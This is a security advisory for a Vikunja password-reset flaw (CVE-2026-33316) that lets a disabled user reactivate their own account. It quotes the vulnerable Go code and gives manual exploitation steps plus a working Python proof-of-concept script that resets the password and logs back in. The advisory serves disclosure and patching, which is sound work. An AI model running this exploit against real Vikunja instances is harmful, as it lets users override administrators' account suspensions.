# [H] Vikunja’s Improper Access Control Enables Bypass of Administrator-Imposed Account Disablement 

## Summary
Severity: High
Advisory: GHSA-vq4q-79hh-q767
CVE: CVE-2026-33316
CWE: CWE-284, CWE-862, CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-vq4q-79hh-q767
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0

## Details
### Summary

A flaw in Vikunja’s password reset logic allows disabled users to regain access to their accounts. The `ResetPassword()` function sets the user’s status to `StatusActive` after a successful password reset without verifying whether the account was previously disabled. By requesting a reset token through `/api/v1/user/password/token` and completing the reset via `/api/v1/user/password/reset`, a disabled user can reactivate their account and bypass administrator-imposed account disablement.

#### Vulnerable Code Snippet

In `pkg/user/user_password_reset.go`, beginning at line 66:

```go
	// Hash the password
	user.Password, err = HashPassword(reset.NewPassword)
	if err != nil {
		return
	}

	err = removeTokens(s, user, TokenPasswordReset)
	if err != nil {
		return
	}

	user.Status = StatusActive // <--- VULNERABILITY: Unconditionally sets status to Active
	_, err = s.
		Cols("password", "status").
		Where("id = ?", user.ID).
		Update(user)
	if err != nil {
		return
	}
```

The code is vulnerable because it assumes that any user resetting their password is transitioning from a normal state or an "Email Confirmation Required" state into an "Active" state. It completely ignores whether the user was placed in the `StatusDisabled` state by an administrator.
Additionally, in the token request function (`RequestUserPasswordResetTokenByEmail`), the system fetches the user via `GetUserWithEmail()` which does **not** filter out disabled users, allowing them to legally request the token in the first place.

### PoC (Proof of Concept)

#### Manual Exploitation Steps

1. Create a standard user account in Vikunja.
2. As an Administrator (or by modifying the database directly), disable the user account by setting their status to Disabled (`status = 2`).
3. Attempt to log in as the disabled user to verify access is blocked (receives `HTTP 412: This account is disabled`).
4. Without authenticating, send a `POST` request to `/api/v1/user/password/token` with the disabled user's email address.
5. Retrieve the password reset token from the incoming email.
6. Send a `POST` request to `/api/v1/user/password/reset` with the token and a new password.
7. Log in using the new password. Observe that the login succeeds (`HTTP 200`) and the account has been maliciously reactivated.

#### Automation PoC

```python
import requests
import psycopg2
import time
import secrets

API_URL = "http://localhost:3456/api/v1"

def main():
    username = f"testuser_{secrets.token_hex(4)}"
    email = f"{username}@example.com"
    password = "SuperSecretPassword123!"
    
    print("[1] Registering user...")
    requests.post(f"{API_URL}/register", json={"username": username, "email": email, "password": password})
    
    print("[2] Admin disables account (Status = 2)...")
    conn = psycopg2.connect(host="localhost", database="vikunja", user="vikunja", password="vikunja_password")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET status = 2 WHERE username = %s;", (username,))
    conn.commit()
    
    print("[3] Verifying login is blocked...")
    res = requests.post(f"{API_URL}/login", json={"username": username, "password": password})
    print(f"Login response: {res.status_code} (Should be 412)")
    
    print("[4] Attacker requests password reset...")
    requests.post(f"{API_URL}/user/password/token", json={"email": email})
    
    print("[5] Attacker grabs token from email/DB...")
    cursor.execute("SELECT id FROM users WHERE username = %s;", (username,))
    user_id = cursor.fetchone()[0]
    cursor.execute("SELECT token FROM user_tokens WHERE user_id = %s AND kind = 1 ORDER BY created DESC LIMIT 1;", (user_id,))
    token = cursor.fetchone()[0]
    
    print("[6] Attacker submits reset, triggering bug...")
    new_password = "HackedPassword123!"
    requests.post(f"{API_URL}/user/password/reset", json={"token": token, "new_password": new_password})
    
    print("[7] Attacker logs in successfully!")
    res = requests.post(f"{API_URL}/login", json={"username": username, "password": new_password})
    print(f"Final Login response: {res.status_code} (Should be 200)")

    cursor.execute("SELECT status FROM users WHERE username = %s;", (username,))
    print(f"Final DB Status: {cursor.fetchone()[0]} (0 = Active)")
    conn.close()

if __name__ == "__main__":
    main()
```

### Impact

* **Authentication & Authorization Bypass:** An attacker can unilaterally reverse an administrative security decision.
* **Integrity & Confidentiality Impact:**  The attacker can regain full access to resources and functionality that were previously restricted due to the account being disabled.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-vq4q-79hh-q767
- https://nvd.nist.gov/vuln/detail/CVE-2026-33316
- https://github.com/go-vikunja/vikunja/commit/049f4a6be46f9460bd516f489ef9f569574bc70d
- https://github.com/go-vikunja/vikunja/commit/d8570c603da1f26635ce6048d6af85ede827abfb
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.0-was-released
